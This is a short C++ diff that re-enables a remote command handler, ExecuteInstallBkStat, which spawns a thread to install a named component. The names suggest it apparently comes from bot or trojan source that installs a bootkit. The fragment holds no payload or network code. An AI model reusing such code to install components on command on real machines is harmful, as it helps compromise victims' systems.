@@ -1033,15 +1033,13 @@ bool Plugin::ExecuteInstallBk(void* Manager, PCHAR Command, PCHAR Args)
 
 bool Plugin::ExecuteInstallBkStat(void* Manager, PCHAR Command, PCHAR Args)
 {
-	return false;
-
 	PDBG("ExecuteInstallBkStat", "Args: '%s'", Args);
 
 	PCHAR ParamList = STR::New(Args);
 
-	string PlugName = GetParamFromParamListByIndex(ParamList, 0);
+	string PlugName = GetCommandParamByIndex(ParamList, 0);
 
-	//DebugReportSaveSettings(ParamList);
+	DebugReportSaveSettings(ParamList);
 
 	StartThread(AsyncInstallBk, STR::New(PlugName.t_str()));
 
